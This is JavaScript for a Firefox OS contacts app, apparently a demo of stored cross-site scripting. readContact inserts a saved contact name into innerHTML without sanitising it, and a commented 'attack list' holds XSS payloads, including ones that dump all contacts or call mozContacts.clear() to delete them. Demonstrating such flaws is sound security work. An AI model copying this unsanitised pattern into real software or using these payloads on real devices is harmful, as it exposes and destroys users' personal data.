/////////////////////////////////////////
//save input to givenname 
/////////////////////////////////////////
function saveContact()
{
  //get name from input text
  var givename=document.getElementById("txName").value;
  //contact webAPI
  var contact = new mozContact();
  contact.init({name: givename, givenName: givename});

  var request = navigator.mozContacts.save(contact);

  request.onsuccess = function() {
     alert("Success saving contact. New contact ID: " + contact.id);
  };

  request.onerror = function() {
     alert("Error saving contact.");
  };
}//end func saveContact


////////////////////////////////////////////
//read contact Info by name
///////////////////////////////////////////////
function readContact()
{
 //temporary store name
 var name1="";
 
 var options1 = {filterBy: ["givenName"],
               filterOp: "equals",
               filterValue:txName.value, 
               sortBy: "givenName",
               sortOrder: "ascending"
 };

 var request1 = navigator.mozContacts.find(options1);

 request1.onsuccess = function() {
    //alert("request1:"+request1.result.length);
    if(request1.result.length > 0) {
        console.log("Found " + request1.result.length + " contacts");
            for (var j=0; j<request1.result[0].name.length; j++) {
              name1= name1  + request1.result[0].name[j];
            }
/*attack list
    "<img src=x onerror=alert(11111)>";
    "<img src=x onerror=readAll()>";
    <iframe SRC=JaVaScRiPt:alert('XSS')>
    <iframe SRC=JaVaScRiPt:alert(1);alert(2)>
    "<img src=x onerror=JaVaScRiPt:alert(1);alert(2)>";
    "<img src=x onerror=JaVaScRiPt:navigator.mozContacts.clear();alert('deleteAll');>";
*/
          spName.innerHTML = name1;

    } else {
        spName.innerHTML = "no contact match";
    }
 }; 
 request1.onerror = function() {
    alert("request1 Error finding contacts.");
 };

}//end func display

////////////////////////////////////////
//read all contact name
////////////////////////////////////////
function readAll()
{
 var cursor = navigator.mozContacts.getAll({}); 
 cursor.onsuccess = function() {
    if(cursor.result) {
        for(var i=0; i<cursor.result.name.length; i++) {
           alert("Name is:"+cursor.result.name[i]);
        }
        cursor.continue();
    }
 };
 
 
 cursor.onerror = function() {
    alert("Error getting contacts");
 };

} //end func readAll
